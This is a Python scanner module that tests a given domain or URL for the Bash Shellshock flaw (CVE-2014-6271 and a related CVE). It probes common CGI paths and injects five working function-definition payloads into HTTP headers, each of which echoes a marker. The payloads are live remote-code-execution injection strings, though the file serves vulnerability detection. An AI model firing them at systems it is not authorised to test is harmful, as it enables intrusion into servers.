"""Shellshock — CVE-2014-6271 Bash Remote Code Execution scanner.

Shellshock allows attackers to execute arbitrary commands by injecting
malicious function definitions into Bash environment variables.
Affects CGI scripts, DHCP clients, SSH forced commands, and more.

Detection: inject shellshock payload in HTTP headers processed by CGI scripts.
"""

from __future__ import annotations

import asyncio
import re
import uuid
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Shellshock payloads — CVE-2014-6271 and related CVEs
_SHELLSHOCK_PAYLOADS: list[tuple[str, str]] = [
    # (payload_template, technique)
    ("() { :; }; echo Content-Type: text/plain; echo; echo MARKER", "cve_2014_6271"),
    ("() { :;}; echo 'Content-Type: text/plain'; echo; echo MARKER", "cve_2014_6271_variant"),
    ("() { _; } >_[$($())] { echo Content-Type: text/plain; echo; echo MARKER; }", "cve_2014_6278"),
    ("() { :; }; /bin/bash -c 'echo MARKER'", "bash_exec"),
    ("() {:;}; echo MARKER", "minimal"),
]

# Headers that may be passed to CGI as environment variables
_CGI_HEADERS: list[str] = [
    "User-Agent",
    "Referer",
    "Cookie",
    "Accept",
    "Accept-Language",
    "Accept-Encoding",
    "X-Forwarded-For",
    "Content-Type",
    "Authorization",
    "Host",
]

# Common CGI paths to test
_CGI_PATHS: list[str] = [
    "/cgi-bin/test-cgi",
    "/cgi-bin/printenv",
    "/cgi-bin/test.cgi",
    "/cgi-bin/index.cgi",
    "/cgi-bin/status",
    "/cgi-bin/",
    "/cgi/",
    "/cgi-local/",
    "/cgi-sys/defaultwebpage.cgi",
    "/htbin/",
    "/cgi-914/",
]

# Shellshock detection pattern in response
_SHELLSHOCK_DETECT = re.compile(r"MARKER|uid=\d+|gid=\d+|Content-Type: text/plain", re.I)


class ShellshockScanner(BaseOsintScanner):
    """Shellshock (CVE-2014-6271) vulnerability scanner.

    Injects Shellshock payloads into HTTP headers sent to CGI-enabled
    endpoints. Tests all headers that Bash CGI scripts pass as environment
    variables. Also checks for CGI path exposure.
    """

    scanner_name = "shellshock"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 86400
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        cgi_paths_found: list[str] = []
        identifiers: list[str] = []

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; ShellshockScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(10)

            # Step 1: Find accessible CGI paths
            async def check_cgi_path(path: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.get(url)
                        if resp.status_code in (200, 500):
                            cgi_paths_found.append(url)
                    except Exception:
                        pass

            await asyncio.gather(*[check_cgi_path(p) for p in _CGI_PATHS])

            # Use base URL if no specific CGI paths found
            test_urls = cgi_paths_found if cgi_paths_found else [base_url]

            # Step 2: Inject shellshock in headers
            async def test_shellshock(target_url: str, header: str, payload: str, technique: str) -> None:
                async with semaphore:
                    try:
                        resp = await client.get(
                            target_url,
                            headers={
                                "User-Agent": "Mozilla/5.0",
                                header: payload,
                            },
                        )
                        body = resp.text

                        if _SHELLSHOCK_DETECT.search(body):
                            vuln = {
                                "url": target_url,
                                "header": header,
                                "payload": payload[:80],
                                "technique": technique,
                                "severity": "critical",
                                "evidence": _SHELLSHOCK_DETECT.search(body).group(0)[:50] if _SHELLSHOCK_DETECT.search(body) else "",
                                "description": f"Shellshock via '{header}' header — command executed",
                                "cve": "CVE-2014-6271",
                            }
                            vulnerabilities.append(vuln)
                            ident = f"vuln:shellshock:{header}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            tasks = []
            for url in test_urls[:5]:
                for header in _CGI_HEADERS:
                    for payload, technique in _SHELLSHOCK_PAYLOADS[:3]:
                        tasks.append(test_shellshock(url, header, payload, technique))

            await asyncio.gather(*tasks)

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "cgi_paths_found": cgi_paths_found,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "is_vulnerable": len(vulnerabilities) > 0,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
